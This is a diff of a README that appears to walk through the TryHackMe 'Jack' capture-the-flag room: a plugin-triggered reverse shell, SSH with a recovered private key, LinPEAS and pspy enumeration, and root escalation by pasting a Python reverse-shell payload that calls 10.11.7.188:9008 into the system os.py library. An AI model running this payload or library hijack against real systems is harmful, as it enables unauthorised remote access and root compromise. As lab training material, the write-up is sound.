@@ -1,4 +1,4 @@
-# JACK-ROOM-From-THM
+<img width="1327" height="375" alt="image" src="https://github.com/user-attachments/assets/23fb556f-6ffc-4c58-8e33-510a51c6ff2d" /># JACK-ROOM-From-THM
 TryHackMe machine “Jack”: a step-by-step guide from reconnaissance and enumeration to exploitation and privilege escalation. Includes the exact commands used, attacker reasoning, and tips to help beginners quickly grasp the pentesting workflow.
 <h3>  <img width="791" height="860" alt="image" src="https://github.com/user-attachments/assets/978b0eea-0802-441a-b8bc-0dc543775ae5" />
  </h3>
@@ -95,4 +95,50 @@ Then click ‘Forward.’
 <h3>Please confirm using the Update button below, then open a terminal and run a listener on the port you intend to use for the backdoor.</h3>
 <img width="887" height="299" alt="image" src="https://github.com/user-attachments/assets/9ab431cb-5c24-4ef1-9417-5da62a348955" />
 <h5>Code listen: nc -lvnp "PORT"</h5>
+<h3>Return to the web interface and trigger the reverse shell in the Installed Plugins section</h3>
+<img width="959" height="806" alt="image" src="https://github.com/user-attachments/assets/d34e9513-3b58-4bc0-875d-29ae5e081b2e" />
+<h3>I gained access and obtained a user shell. I returned to the home directory, changed into user jack’s home, and found the user.txt flag.</h3>
+<img width="1420" height="690" alt="image" src="https://github.com/user-attachments/assets/542e3869-07b1-47f9-8699-4acf33d081bd" />
+
+<h3>I navigated to the backups directory and recovered the id_rsam private key, which I used to authenticate via SSH (the lab had SSH enabled).</h3>
+<img width="1310" height="528" alt="image" src="https://github.com/user-attachments/assets/e5828fb8-4348-47f5-89e0-3acf4d841baa" />
+<img width="1029" height="528" alt="image" src="https://github.com/user-attachments/assets/bf6955fb-2406-4a37-ab7f-2fd8c428ecef" />
+<h5>code ssh: ssh -i "your file ssh" jack@jack.thm</h5>
+
+<h1>5. Privilege Escalation</h1>
+<h2>I used LinPEAS to analyze the entire system of the user Jack.</h2>
+<img width="2000" height="234" alt="image" src="https://github.com/user-attachments/assets/b0355b38-3881-418a-ae68-595f4ee79b57" />
+<img width="431" height="407" alt="image" src="https://github.com/user-attachments/assets/95719270-2c49-4858-8257-656a65fcf06c" />
+<h3>I noticed that Jack’s ID belongs to the ‘family’ group, and there is a suspicious Python 2.7 version present on the system.</h3>
+
+<h3>Using pspy for real-time process monitoring, I detected a script called status checker.py running on the system</h3>
+<img width="498" height="536" alt="image" src="https://github.com/user-attachments/assets/81d5524d-7c0e-4e51-9e9b-469049dbb60e" />
+<img width="970" height="233" alt="image" src="https://github.com/user-attachments/assets/a24c369b-fc5e-4b91-a423-a9df203e44cd" />
+
+<h3>Reviewing /opt/statuscheck/checker.py revealed the root escalation vector: the script invokes os.system. A subsequent find for files belonging to the family group returned a system os.py (located under the Python 2.7 library), which is potentially relevant.</h3>
+<img width="883" height="267" alt="image" src="https://github.com/user-attachments/assets/d933a532-0954-4e83-b0d4-8d1b25c1afd8" />
+
+<h3>Next, open /usr/lib/python2.7/os.py with vim or nano and paste a Python reverse-shell payload into the file.</h3>
+import socket
+import pty
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.11.7.188",9008))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+<h3>Then start listening on the port used for the reverse shell</h3>
+<img width="623" height="448" alt="image" src="https://github.com/user-attachments/assets/50611833-bd04-4efa-9c78-14ac106af8a4" />
+
+<h3>Next, invoke the shell using the following command:tail –f /var/log/syslog</h3>
+<img width="533" height="105" alt="image" src="https://github.com/user-attachments/assets/10478f88-7650-4afb-ab31-e6626f1f7709" />
+
+<h3>Wait a few minutes for the reverse shell to appear.</h3>
+<img width="1315" height="429" alt="image" src="https://github.com/user-attachments/assets/75208eeb-2af6-424e-ae60-b5d522737337" />
+
+<h1>THE END</h1>
+
+
+
+
 
